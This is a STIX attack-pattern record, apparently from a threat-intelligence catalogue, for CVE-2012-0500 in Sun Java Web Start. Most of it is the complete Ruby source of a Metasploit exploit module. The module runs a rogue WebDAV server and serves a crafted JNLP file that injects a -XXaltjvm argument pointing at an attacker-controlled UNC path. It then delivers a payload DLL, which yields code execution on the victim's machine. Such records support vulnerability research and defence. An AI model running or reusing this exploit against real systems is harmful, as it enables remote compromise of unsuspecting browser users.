{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--35b5a81e-eb31-483e-ae0e-4372b2d7251b",
    "created": "2024-08-14T16:44:05.725041Z",
    "modified": "2024-08-14T16:44:05.725046Z",
    "name": "Sun Java Web Start Plugin Command Line Argument Injection",
    "description": " This module exploits a flaw in the Web Start component of the Sun Java Runtime Environment. The arguments passed to Java Web Start are not properly validated, allowing injection of arbitrary arguments to the JVM.  By utilizing the lesser known -J option, an attacker can take advantage of the -XXaltjvm option, as discussed previously by Ruben Santamarta. This method allows an attacker to execute arbitrary code in the context of an unsuspecting browser user.  In order for this module to work, it must be run as root on a server that does not serve SMB. Additionally, the target host must have the WebClient service (WebDAV Mini-Redirector) enabled.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/java_ws_vmargs.rb",
            "external_id": "java_ws_vmargs.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2012-0500"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/fulldisclosure/2012/Feb/251"
        },
        {
            "source_name": "reference",
            "url": "http://www.oracle.com/technetwork/topics/security/javacpufeb2012-366318.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  #\n  # This module acts as an HTTP server\n  #\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Exploit::EXE\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Sun Java Web Start Plugin Command Line Argument Injection',\n      'Description'    => %q{\n          This module exploits a flaw in the Web Start component of the Sun Java\n        Runtime Environment. The arguments passed to Java Web Start are not properly\n        validated, allowing injection of arbitrary arguments to the JVM.\n\n        By utilizing the lesser known -J option, an attacker can take advantage of\n        the -XXaltjvm option, as discussed previously by Ruben Santamarta. This method\n        allows an attacker to execute arbitrary code in the context of an unsuspecting\n        browser user.\n\n        In order for this module to work, it must be run as root on a server that\n        does not serve SMB. Additionally, the target host must have the WebClient\n        service (WebDAV Mini-Redirector) enabled.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         => 'jduck', # Bug reported to Oracle by TELUS\n      'References'     =>\n        [\n          [ 'CVE', '2012-0500' ],\n          [ 'OSVDB', '79227' ],\n          [ 'BID', '52015' ],\n          [ 'URL', 'https://seclists.org/fulldisclosure/2012/Feb/251' ],\n          [ 'URL', 'http://www.oracle.com/technetwork/topics/security/javacpufeb2012-366318.html' ]\n        ],\n      'Platform'       => 'win',\n      'Payload'        =>\n        {\n          'Space'    => 1024,\n          'BadChars' => '',\n          'DisableNops' => true,\n          'PrependEncoder' => \"\\x81\\xc4\\x54\\xf2\\xff\\xff\"\n        },\n      'Targets'        =>\n        [\n          [ 'Automatic', { } ],\n          [ 'Java Runtime on Windows x86',\n            {\n              'Platform' => 'win',\n              'Arch' => ARCH_X86\n            }\n          ],\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2012-02-14'\n      ))\n\n    register_options(\n      [\n        OptPort.new('SRVPORT', [ true, \"The daemon port to listen on\", 80 ]),\n        OptString.new('URIPATH', [ true, \"The URI to use.\", \"/\" ]),\n        OptString.new('UNCPATH', [ false, 'Override the UNC path to use. (Use with an SMB server)' ])\n      ])\n  end\n\n\n  def auto_target(cli, request)\n    agent = request.headers['User-Agent']\n\n    ret = nil\n    #print_status(\"Agent: #{agent}\")\n    # Check for MSIE and/or WebDAV redirector requests\n    if agent =~ /(Windows NT (5|6)\\.(0|1|2)|MiniRedir\\/(5|6)\\.(0|1|2))/\n      ret = targets[1]\n    elsif agent =~ /MSIE (6|7|8)\\.0/\n      ret = targets[1]\n    else\n      print_status(\"Unknown User-Agent #{agent}\")\n    end\n\n    ret\n  end\n\n\n  def on_request_uri(cli, request)\n\n    # For this exploit, this does little besides ensures the user agent is a recognized one..\n    mytarget = target\n    if target.name == 'Automatic'\n      mytarget = auto_target(cli, request)\n      if (not mytarget)\n        send_not_found(cli)\n        return\n      end\n    end\n\n    # Special case to process OPTIONS for /\n    if (request.method == 'OPTIONS' and request.uri == '/')\n      process_options(cli, request, mytarget)\n      return\n    end\n\n    # Discard requests for ico files\n    if (request.uri =~ /\\.ico$/i)\n      send_not_found(cli)\n      return\n    end\n\n    # If there is no subdirectory in the request, we need to redirect.\n    if (request.uri == '/') or not (request.uri =~ /\\/([^\\/]+)\\//)\n      if (request.uri == '/')\n        subdir = '/' + rand_text_alphanumeric(8+rand(8)) + '/'\n      else\n        subdir = request.uri + '/'\n      end\n      print_status(\"Request for \\\"#{request.uri}\\\" does not contain a sub-directory, redirecting to #{subdir} ...\")\n      send_redirect(cli, subdir)\n      return\n    else\n      share_name = $1\n    end\n\n    # dispatch WebDAV requests based on method first\n    case request.method\n    when 'OPTIONS'\n      process_options(cli, request, mytarget)\n\n    when 'PROPFIND'\n      process_propfind(cli, request, mytarget)\n\n    when 'GET'\n      process_get(cli, request, mytarget, share_name)\n\n    when 'PUT'\n      print_status(\"Sending 404 for PUT #{request.uri} ...\")\n      send_not_found(cli)\n\n    else\n      print_error(\"Unexpected request method encountered: #{request.method}\")\n\n    end\n\n  end\n\n  #\n  # GET requests\n  #\n  def process_get(cli, request, target, share_name)\n\n    print_status(\"Responding to \\\"GET #{request.uri}\\\" request\")\n    # dispatch based on extension\n    if (request.uri =~ /\\.dll$/i)\n      #\n      # DLL requests sent by IE and the WebDav Mini-Redirector\n      #\n      print_status(\"Sending DLL\")\n\n      # Re-generate the payload\n      return if ((p = regenerate_payload(cli)) == nil)\n\n      # Generate a DLL based on the payload\n      dll_data = generate_payload_dll({ :code => p.encoded })\n\n      # Send it :)\n      send_response(cli, dll_data, { 'Content-Type' => 'application/octet-stream' })\n\n    elsif (request.uri =~ /\\.jnlp$/i)\n      #\n      # Send the jnlp document\n      #\n\n      # Prepare the UNC path...\n      if (datastore['UNCPATH'])\n        unc = datastore['UNCPATH'].dup\n      else\n        # This could probably use the Host header from the request\n        my_host = (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address(cli.peerhost) : datastore['SRVHOST']\n        unc = \"\\\\\\\\\" + my_host + \"\\\\\" + share_name\n      end\n\n      # NOTE: we ensure there's only a single backslash here since it will get escaped\n      if unc[0,2] == \"\\\\\\\\\"\n        unc.slice!(0, 1)\n      end\n\n      http_agent = Rex::Text.rand_text_alpha(8+rand(8))\n\n      jnlp_data = <<-EOS\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<jnlp version=\"1\">\n<information>\n   <title>#{Rex::Text.rand_text_alpha(rand(10)+10)}</title>\n   <vendor>#{Rex::Text.rand_text_alpha(rand(10)+10)}</vendor>\n   <description>#{Rex::Text.rand_text_alpha(rand(10)+10)}</description>\n</information>\n<resources>\n   <java version=\"1.3+\" initial-heap-size='512m\" -J-XXaltjvm=#{unc} \"' />\n</resources>\n<resources><java java-vm-args='-Dhttp.agent=#{http_agent}\"' /></resources>\n</jnlp>\nEOS\n      print_status(\"Sending JNLP\")\n      send_response(cli, jnlp_data, { 'Content-Type' => 'application/x-java-jnlp-file' })\n\n    else\n      print_status(\"Sending redirect to the JNLP file\")\n      jnlp_name = Rex::Text.rand_text_alpha(8 + rand(8))\n\n      jnlp_path = get_resource()\n      if jnlp_path[-1,1] != '/'\n        jnlp_path << '/'\n      end\n      jnlp_path << request.uri.split('/')[-1] << '/'\n      jnlp_path << jnlp_name << \".jnlp\"\n\n      send_redirect(cli, jnlp_path, '')\n\n    end\n\n  end\n\n  #\n  # OPTIONS requests sent by the WebDav Mini-Redirector\n  #\n  def process_options(cli, request, target)\n    print_status(\"Responding to WebDAV \\\"OPTIONS #{request.uri}\\\" request\")\n    headers = {\n      #'DASL'   => '<DAV:sql>',\n      #'DAV'    => '1, 2',\n      'Allow'  => 'OPTIONS, GET, PROPFIND',\n      'Public' => 'OPTIONS, GET, PROPFIND'\n    }\n    send_response(cli, '', headers)\n  end\n\n\n  #\n  # PROPFIND requests sent by the WebDav Mini-Redirector\n  #\n  def process_propfind(cli, request, target)\n    path = request.uri\n    print_status(\"Received WebDAV \\\"PROPFIND #{request.uri}\\\" request\")\n    body = ''\n\n    if (path =~ /\\.dll$/i)\n      # Response for the DLL\n      print_status(\"Sending DLL multistatus for #{path} ...\")\n#<lp1:getcontentlength>45056</lp1:getcontentlength>\n      body = %Q|<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<D:multistatus xmlns:D=\"DAV:\">\n<D:response xmlns:lp1=\"DAV:\" xmlns:lp2=\"http://apache.org/dav/props/\">\n<D:href>#{path}</D:href>\n<D:propstat>\n<D:prop>\n<lp1:resourcetype/>\n<lp1:creationdate>2010-02-26T17:07:12Z</lp1:creationdate>\n<lp1:getlastmodified>Fri, 26 Feb 2010 17:07:12 GMT</lp1:getlastmodified>\n<lp1:getetag>\"39e0132-b000-43c6e5f8d2f80\"</lp1:getetag>\n<lp2:executable>F</lp2:executable>\n<D:lockdiscovery/>\n<D:getcontenttype>application/octet-stream</D:getcontenttype>\n</D:prop>\n<D:status>HTTP/1.1 200 OK</D:status>\n</D:propstat>\n</D:response>\n</D:multistatus>\n|\n\n    elsif (path =~ /\\/$/) or (not path.sub('/', '').index('/'))\n      # Response for anything else (generally just /)\n      print_status(\"Sending directory multistatus for #{path} ...\")\n      body = %Q|<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<D:multistatus xmlns:D=\"DAV:\">\n<D:response xmlns:lp1=\"DAV:\" xmlns:lp2=\"http://apache.org/dav/props/\">\n<D:href>#{path}</D:href>\n<D:propstat>\n<D:prop>\n<lp1:resourcetype><D:collection/></lp1:resourcetype>\n<lp1:creationdate>2010-02-26T17:07:12Z</lp1:creationdate>\n<lp1:getlastmodified>Fri, 26 Feb 2010 17:07:12 GMT</lp1:getlastmodified>\n<lp1:getetag>\"39e0001-1000-4808c3ec95000\"</lp1:getetag>\n<D:lockdiscovery/>\n<D:getcontenttype>httpd/unix-directory</D:getcontenttype>\n</D:prop>\n<D:status>HTTP/1.1 200 OK</D:status>\n</D:propstat>\n</D:response>\n</D:multistatus>\n|\n\n    else\n      print_status(\"Sending 404 for #{path} ...\")\n      send_not_found(cli)\n      return\n\n    end\n\n    # send the response\n    resp = create_response(207, \"Multi-Status\")\n    resp.body = body\n    resp['Content-Type'] = 'text/xml'\n    cli.send_response(resp)\n  end\n\n\n  #\n  # Make sure we're on the right port/path to support WebDAV\n  #\n  def exploit\n    if datastore['SRVPORT'].to_i != 80 || datastore['URIPATH'] != '/'\n      fail_with(Failure::Unknown, 'Using WebDAV requires SRVPORT=80 and URIPATH=/')\n    end\n\n    super\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-02-14",
    "x_mitre_platforms": [
        "win'"
    ]
}